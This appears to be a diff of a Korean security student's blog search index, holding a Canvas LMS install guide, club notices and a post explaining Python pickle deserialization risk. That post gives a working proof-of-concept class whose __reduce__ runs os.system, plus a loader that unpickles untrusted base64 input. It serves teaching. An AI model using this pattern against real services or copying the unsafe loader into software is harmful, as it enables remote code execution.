@@ -4,6 +4,258 @@
   
     
     <entry>
+      <title>websec-baby</title>
+      <link href="2021/01/17/websec-baby/"/>
+      <url>2021/01/17/websec-baby/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>canvas lms installation</title>
+      <link href="2020/06/27/canvas-install-200627/"/>
+      <url>2020/06/27/canvas-install-200627/</url>
+      
+        <content type="html"><![CDATA[<h3 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h3><p>OS : Ubuntu 16.04 Desktop(<a href="http://old-releases.ubuntu.com/releases/16.04.4/">http://old-releases.ubuntu.com/releases/16.04.4/</a>)</p><p>Canvas LMS - Open Source : <a href="https://github.com/instructure/canvas-lms">https://github.com/instructure/canvas-lms</a></p><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><h3 id="postgresql-설치"><a href="#postgresql-설치" class="headerlink" title="postgresql 설치"></a>postgresql 설치</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install postgresql-9.5</span><br></pre></td></tr></table></figure><hr><h3 id="관리자-계정-생성"><a href="#관리자-계정-생성" class="headerlink" title="관리자 계정 생성"></a>관리자 계정 생성</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser sysadmin</span><br></pre></td></tr></table></figure><hr><h3 id="sysadmin-계정에-대한-Root-권한-부여"><a href="#sysadmin-계정에-대한-Root-권한-부여" class="headerlink" title="sysadmin 계정에 대한 Root 권한 부여"></a>sysadmin 계정에 대한 Root 권한 부여</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visudo → User Privileges → sysadmin ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><hr><h3 id="sysadmin-계정으로-사용자-변경"><a href="#sysadmin-계정으로-사용자-변경" class="headerlink" title="sysadmin 계정으로 사용자 변경"></a>sysadmin 계정으로 사용자 변경</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su sysadmin</span><br></pre></td></tr></table></figure><hr><h3 id="postgres-설정"><a href="#postgres-설정" class="headerlink" title="postgres 설정"></a>postgres 설정</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres createuser canvas --no-createdb \</span><br><span class="line">   --no-superuser --no-createrole --pwprompt</span><br><span class="line"></span><br><span class="line">sudo -u postgres createdb canvas_production --owner=canvas</span><br></pre></td></tr></table></figure><hr><h3 id="git-설정"><a href="#git-설정" class="headerlink" title="git 설정"></a>git 설정</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-core</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/instructure/canvas-lms.git canvas</span><br><span class="line"><span class="built_in">cd</span> canvas</span><br><span class="line">git checkout stable</span><br></pre></td></tr></table></figure><hr><h3 id="installation-1"><a href="#installation-1" class="headerlink" title="installation(1)"></a>installation(1)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /var/canvas</span><br><span class="line">sudo chown -R sysadmin /var/canvas</span><br><span class="line"></span><br><span class="line">$(canvas) cp -av . /var/canvas</span><br></pre></td></tr></table></figure><hr><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><hr><h3 id="ruby2-4-install"><a href="#ruby2-4-install" class="headerlink" title="ruby2.4 install"></a>ruby2.4 install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby2.4 ruby2.4-dev zlib1g-dev libxml2-dev \</span><br><span class="line">                       libsqlite3-dev postgresql libpq-dev \</span><br><span class="line">                       libxmlsec1-dev curl make g++</span><br></pre></td></tr></table></figure><hr><h3 id="node-js-install"><a href="#node-js-install" class="headerlink" title="node.js install"></a>node.js install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -</span><br><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure><hr><h3 id="set-sysadmin-postgres-superuser"><a href="#set-sysadmin-postgres-superuser" class="headerlink" title="set sysadmin postgres superuser"></a>set sysadmin postgres superuser</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u postgres createuser <span class="variable">$USER</span></span><br><span class="line">$ sudo -u postgres psql -c <span class="string">&quot;alter user <span class="variable">$USER</span> with superuser&quot;</span> postgres</span><br></pre></td></tr></table></figure><hr><h3 id="bundler-and-canvas-dependencies"><a href="#bundler-and-canvas-dependencies" class="headerlink" title="bundler and canvas dependencies"></a>bundler and canvas dependencies</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo gem install bundler --version 1.13.7</span><br><span class="line">$ bundle _1.13.7_ install --path vendor/bundle</span><br></pre></td></tr></table></figure><hr><h3 id="yarn-installation"><a href="#yarn-installation" class="headerlink" title="yarn installation"></a>yarn installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;deb https://dl.yarnpkg.com/debian/ stable main&quot;</span> | sudo tee /etc/apt/sources.list.d/yarn.list</span><br><span class="line">$ sudo apt-get update &amp;&amp; sudo apt-get install yarn=1.10.1-1</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install python</span><br><span class="line">$ yarn install</span><br></pre></td></tr></table></figure><hr><h3 id="canvas-default-config"><a href="#canvas-default-config" class="headerlink" title="canvas default config"></a>canvas default config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">for</span> config <span class="keyword">in</span> amazon_s3 database \</span><br><span class="line">  delayed_jobs domain file_store outgoing_mail security external_migration; \</span><br><span class="line">  <span class="keyword">do</span> cp config/<span class="variable">$config</span>.yml.example config/<span class="variable">$config</span>.yml; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><hr><h3 id="dynamic-setting"><a href="#dynamic-setting" class="headerlink" title="dynamic setting"></a>dynamic setting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/dynamic_settings.yml.example config/dynamic_settings.yml</span><br><span class="line">$ (check) nano config/dynamic_settings.yml (vi로 진행해도 상관 없음)</span><br></pre></td></tr></table></figure><hr><h3 id="database-setting"><a href="#database-setting" class="headerlink" title="database setting"></a>database setting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/database.yml.example config/database.yml</span><br><span class="line">$ (check) nano config/database.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do not create a queue: section for your test environment</span></span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_test</span><br><span class="line">  host: localhost</span><br><span class="line">  username: canvas</span><br><span class="line">  timeout: 5000</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_development</span><br><span class="line">  timeout: 5000</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_production</span><br><span class="line">  host: localhost</span><br><span class="line">  username: canvas</span><br><span class="line">  password: your_password</span><br><span class="line">  timeout: 5000</span><br></pre></td></tr></table></figure><hr><h3 id="outgoing-mail-config"><a href="#outgoing-mail-config" class="headerlink" title="outgoing mail config"></a>outgoing mail config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/outgoing_mail.yml.example config/outgoing_mail.yml</span><br><span class="line">$ (check) nano config/outgoing_mail.yml (vi로 진행해도 상관 없음)</span><br></pre></td></tr></table></figure><hr><h3 id="url-config"><a href="#url-config" class="headerlink" title="url config"></a>url config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/domain.yml.example config/domain.yml</span><br><span class="line">$ (check) nano config/domain.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  domain: <span class="string">&quot;canvas.jhyeon.xyz&quot;</span></span><br><span class="line">  <span class="comment"># whether this instance of canvas is served over ssl (https) or not</span></span><br><span class="line">  <span class="comment"># defaults to true for production, false for test/development</span></span><br><span class="line">  ssl: <span class="literal">false</span></span><br><span class="line">  <span class="comment"># files_domain: &quot;canvasfiles.example.com&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="security-config"><a href="#security-config" class="headerlink" title="security config"></a>security config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/security.yml.example config/security.yml</span><br><span class="line">$ nano config/security.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line">production: &amp;default</span><br><span class="line">  <span class="comment"># replace this with a random string of at least 20 characters</span></span><br><span class="line">  encryption_key: 12345123451234512345</span><br><span class="line">  lti_iss: <span class="string">&#x27;https://canvas.instructure.com&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="generate-assets"><a href="#generate-assets" class="headerlink" title="generate assets"></a>generate assets</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ (/var/canvas) mkdir -p <span class="built_in">log</span> tmp/pids public/assets app/stylesheets/brandable_css_brands</span><br><span class="line">$ (/var/canvas) touch app/stylesheets/_brandable_variables_defaults_autogenerated.scss</span><br><span class="line">$ (/var/canvas) touch Gemfile.lock</span><br><span class="line">$ (/var/canvas) touch <span class="built_in">log</span>/production.log</span><br><span class="line">$ (/var/canvas) sudo adduser --disabled-password --gecos canvas canvasuser</span><br><span class="line">$ (/var/canvas) sudo chown -R canvasuser config/environment.rb <span class="built_in">log</span> tmp public/assets \</span><br><span class="line">                              app/stylesheets/_brandable_variables_defaults_autogenerated.scss \</span><br><span class="line">                              app/stylesheets/brandable_css_brands Gemfile.lock config.ru</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ (/var/canvas) yarn install</span><br><span class="line">$ (/var/canvas) RAILS_ENV=production bundle <span class="built_in">exec</span> rake canvas:compile_assets</span><br><span class="line">$ (/var/canvas) sudo chown -R canvasuser public/dist/brandable_css</span><br><span class="line"></span><br><span class="line">$ (/var/canvas) RAILS_ENV=production bundle <span class="built_in">exec</span> rake brand_configs:generate_and_upload_all</span><br><span class="line"></span><br><span class="line">* VM 메모리 최소 8GB 메모리 구성 필요합니다.</span><br></pre></td></tr></table></figure><hr><h3 id="database-population"><a href="#database-population" class="headerlink" title="database population"></a>database population</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAILS_ENV=production bundle <span class="built_in">exec</span> rake db:initial_setup</span><br></pre></td></tr></table></figure><hr><h3 id="apache2-installation"><a href="#apache2-installation" class="headerlink" title="apache2 installation"></a>apache2 installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install passenger libapache2-mod-passenger apache2</span><br><span class="line">$ sudo a2enmod rewrite</span><br><span class="line">$ sudo a2enmod passenger</span><br><span class="line">$ sudo a2enmod ssl</span><br><span class="line">$ sudo unlink /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line">아래 단계 완료 후 수행</span><br><span class="line">$ sudo a2ensite canvas</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">  ServerName canvas.jhyeon.xyz</span><br><span class="line">  ServerAlias canvasfiles.canvas.jhyeon.xyz</span><br><span class="line">  ServerAdmin admin@canvas.jhyeon.xyz</span><br><span class="line">  DocumentRoot /var/canvas/public</span><br><span class="line">  ErrorLog /var/<span class="built_in">log</span>/apache2/canvas_errors.log</span><br><span class="line">  LogLevel warn</span><br><span class="line">  CustomLog /var/<span class="built_in">log</span>/apache2/canvas_access.log combined</span><br><span class="line">  SetEnv RAILS_ENV production</span><br><span class="line">  &lt;Directory /var/canvas/public&gt;</span><br><span class="line">    Options All</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">    Options -MultiViews</span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="cache-config"><a href="#cache-config" class="headerlink" title="cache config"></a>cache config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository ppa:chris-lea/redis-server</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install redis-server</span><br><span class="line"></span><br><span class="line">$ sudo cp config/cache_store.yml.example config/cache_store.yml</span><br><span class="line">$ sudo vi config/cache_store.yml</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line">development:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line">production:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line"></span><br><span class="line">$ sudo chown canvasuser config/cache_store.yml</span><br><span class="line"></span><br><span class="line">$ sudo cp config/redis.yml.example config/redis.yml</span><br><span class="line">$ sudo vi config/redis.yml</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  servers:</span><br><span class="line">    - redis://localhost</span><br><span class="line"></span><br><span class="line">$ sudo chown canvasuser config/redis.yml</span><br></pre></td></tr></table></figure><hr><h3 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s /var/canvas/script/canvas_init /etc/init.d/canvas_init</span><br><span class="line">$ sudo update-rc.d canvas_init defaults</span><br><span class="line">$ sudo /etc/init.d/canvas_init start</span><br><span class="line">$ sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure><hr><h3 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h3><ul><li><p><a href="https://github.com/instructure/canvas-lms/wiki/Production-Start">https://github.com/instructure/canvas-lms/wiki/Production-Start</a></p></li><li><p><a href="https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49">https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Memo </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CANVAS </tag>
+            
+            <tag> LMS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>동아리 워게임 홍보(?)</title>
+      <link href="2020/06/19/bangsiri-wargame-200619/"/>
+      <url>2020/06/19/bangsiri-wargame-200619/</url>
+      
+        <content type="html"><![CDATA[<p>올해 3월을 끝으로 기존 CTFd 에서 운영하던 동아리 학습용 CTF 서버를</p><p>자체 플랫폼으로 이전 하였습니당, 문제도 기존과 다르게 모의 해킹 분야별로 많이 업데이트 할 예정이고,</p><p>동아리 원이 아니더라도 문제 풀어보실 수 있으니 많이 이용 해주세요!</p><p><a href="https://wargame.hacking.one/">https://wargame.hacking.one/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Memo </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> B@ngsiri </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Python Pickle Library Vulnability</title>
+      <link href="2020/06/16/python-pickle-200616/"/>
+      <url>2020/06/16/python-pickle-200616/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Python-Pickle"><a href="#Python-Pickle" class="headerlink" title="Python Pickle"></a>Python Pickle</h3><p>Python Pickle은 직렬화(Pickling) , 역직렬화(UnPickling) 을 지원하는 모듈 입니다.</p><hr><h3 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h3><p>해당 모듈은 공식 문서에서도 사용을 권장하지 않습니다, 데이터를 역직렬화(UnPickling) 할 때,</p><p>임의의 코드를 실행하는 등의 악의적인 데이터로 구성하여 RCE(Remote Control Exexecution) 등의 공격이 가능하게 됩니다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__getnewargs_ex__()</span><br><span class="line"><span class="built_in">object</span>.__getnewargs__()</span><br><span class="line"><span class="built_in">object</span>.__getstate__()</span><br><span class="line"><span class="built_in">object</span>.__setstate__(state)</span><br><span class="line"><span class="built_in">object</span>.__reduce__()</span><br><span class="line"><span class="built_in">object</span>.__reduce_ex__(protocol)</span><br></pre></td></tr></table></figure><p>reduce() 메서드는 아무런 인자도 받지 않지만, 튜플을 반환할 때 함수를 반환하는 것이 가능합니다.</p><p>[pickling.py]</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">shellcode = cPickle.dumps(Exploit())</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(shellcode)</span><br></pre></td></tr></table></figure><p>[ex.py]</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cPickle.loads(base64.b64decode(data))</span><br></pre></td></tr></table></figure><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://docs.python.org/ko/3/library/pickle.html#data-stream-format">https://docs.python.org/ko/3/library/pickle.html#data-stream-format</a></p></li><li><p><a href="https://github.com/JHye0n/Web-CTF-Cheatsheet">https://github.com/JHye0n/Web-CTF-Cheatsheet</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Memo </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>S/W 소프트웨어 개발 프로세스 모델</title>
+      <link href="2020/06/13/swmodel-200613/"/>
+      <url>2020/06/13/swmodel-200613/</url>
+      
+        <content type="html"><![CDATA[<p>개발 프로세스와 관련해서 여러 많은 자료를 찾아 보고 개인 공부 겸 정리 하였습니다.</p><p>이론 부분에 있어서도 한 두가지가 아니다보니 많이 헷갈리는데 앞으로 더 꾸준히 공부해야 겠네요..</p><p>해당 내용은 아래 노션에 작성되어 있습니다.</p><p><a href="https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342">https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Memo </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Algorithm </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>동아리 온라인 시험 플랫폼 개발 후기</title>
+      <link href="2020/06/12/exam-platformdev-200612/"/>
+      <url>2020/06/12/exam-platformdev-200612/</url>
+      
+        <content type="html"><![CDATA[<h3 id="간단-계기"><a href="#간단-계기" class="headerlink" title="간단, 계기"></a>간단, 계기</h3><p>요즘 코로나19 영향 때문에 학교는 물론 동아리 운영도 쉽지 않다.</p><p>이번 동아리 신입생 선발 시험에 관련해서 임원진들과 몇가지 생각해본 것이 있는데</p><p>오프라인으로 진행하기에는 사실 장소 대여도 쉽지 않아서 여러 방안을 생각해보다가</p><p>온라인으로 시험을 진행하기로 했는데 이 방법 역시 쉬운 방법만은 아니였다.</p><p>이유는 시험에 대한 감독을 진행할 수 없다는 점(부정 행위)에 대한 문제점이 가장 크게 작용하였는데,</p><p>제출 확인을 할 때 출제자 들이 조금 더 엄격하게 체크해야 하는 쪽이 제일 최선의 방법인 것 같았다.</p><p>또한 C/Python 마다 속해있는 인원이 달라 문제 배포에 대해서도 문제점이 있었는데,</p><p>이 부분은 내가 웹 개발을 해주겠다고 해서 문제가 일단 해결되었다.</p><hr><h3 id="개발-과정"><a href="#개발-과정" class="headerlink" title="개발 과정"></a>개발 과정</h3><p>시험은 오는 6월 18일에 진행을 예정하고 있다. 사실 BoB 준비도 그렇고 다른 일때문에 바쁘다 보니</p><p>5월 말이나 되서야 개발을 시작하게 되었는데 오늘 날짜로 한 2주 살짝 넘게 작업을 했었고,</p><p>교내 동아리 서버를 이용해서 도커로 웹 서버를 구축하고 기능을 하나씩 만들어 갔던 기억이 있다.</p><p>사실 단순하게 운영에 꼭 필요한 기능들만 생각하고 개발을 했는데 시큐어 코딩을 계속 적용해야 하다보니 생각해야할 부분이 많았다.</p><p>또한, 개발하면서 임원진들이 개선 요청이 자주 있었을뿐더러 테스트를 할 때 예상과 다르게 작동되는 기능이 몇가지 있어서 계속 수정 하면서 릴리즈 했던 기억이 있다..</p><hr><h3 id="주요-기능"><a href="#주요-기능" class="headerlink" title="주요 기능"></a>주요 기능</h3><ul><li>로그인</li><li>회원가입</li><li>코드 컴파일러</li><li>시험 문제 풀이</li><li>제출</li></ul><p>[로그인] &amp; [회원가입] : 신입생(회원) 여부를 체크하기 위한 목적</p><p>[코드컴파일러] : 문제를 보고 자신이 작성한 코드가 정상적으로 작동되는지를 보기 위한 컴파일러이다. (Sphere Engine API)</p><p>[시험문제] : 회원가입 때 본인이 응시하겠다고 하는 분야를 바탕으로 (공통 분야/선택한 분야) 를 포함하여 문제가 공개된다.</p><p>[제출] : 제출할 때 편의성(?) 을 조금 더 높히고자 파일을 업로드 받아 메일 서버를 통해서 동아리 관리 계정으로 이메일이 발송되도록 구현 했다.</p><hr><h3 id="개인적인-생각"><a href="#개인적인-생각" class="headerlink" title="개인적인 생각"></a>개인적인 생각</h3><p>혼자서 웹 하나를 구축해 나가면서 생각지도 못한 부분에서 취약점도 있었고, 로직 버그도 1~2개씩 있었던 것 같다.</p><p>그리고 대부분 DB 서버로 연동해서 자동화 처리를 수행했는데 시험 페이지쪽에 시간을 설정하는 쪽에는 아직 수동으로 구축되어 있다.</p><p>이 부분은 아마 이번 주말내에 관리 모듈에서 연동할 수 있도록 해서 추가할 예정중에 있다.</p><p>그리고 기능에 대해서도 자체적으로 구현하면 좋을 수 있는 것들이 많았지만 시간적인 문제도 있었기에 모든 부분을 다 구현하지는 못했다.</p><p>하나의 웹을 만들어 나가면서 부족한 점도 많이 느낄 수 있었던 부분인 것 같다.</p><h3 id="오픈-소스"><a href="#오픈-소스" class="headerlink" title="오픈 소스"></a>오픈 소스</h3><p><a href="https://github.com/JHye0n/bangsiri_online_exam">https://github.com/JHye0n/bangsiri_online_exam</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Memo </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Development </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>워게임 사이트 추천</title>
+      <link href="2020/06/03/wargame-list-200603/"/>
+      <url>2020/06/03/wargame-list-200603/</url>
+      
+        <content type="html"><![CDATA[<p>해당 자료는 아래 노션에 작성되어 있습니다.</p><p><a href="https://www.notion.so/jhyeon/43ce112d299d42e0be73e5da5d9be39a">https://www.notion.so/jhyeon/43ce112d299d42e0be73e5da5d9be39a</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Memo </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Wargame </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Browser Auditor 기술 발표 자료</title>
+      <link href="2020/05/26/browser-auditor-200526/"/>
+      <url>2020/05/26/browser-auditor-200526/</url>
+      
+        <content type="html"><![CDATA[<h3 id="발표자료"><a href="#발표자료" class="headerlink" title="발표자료"></a>발표자료</h3><p>2019년 11월에 있었던 KUCIS 서경강권역 학술 세미나에서 발표 자료로 썼던 내용 입니다.</p><p>자료 다운로드 : <a href="https://drive.google.com/open?id=1mWcSwYwmdUHYZDLgb7szeHc7gbczpcpc">https://drive.google.com/open?id=1mWcSwYwmdUHYZDLgb7szeHc7gbczpcpc</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Browser Auditor </tag>
+            
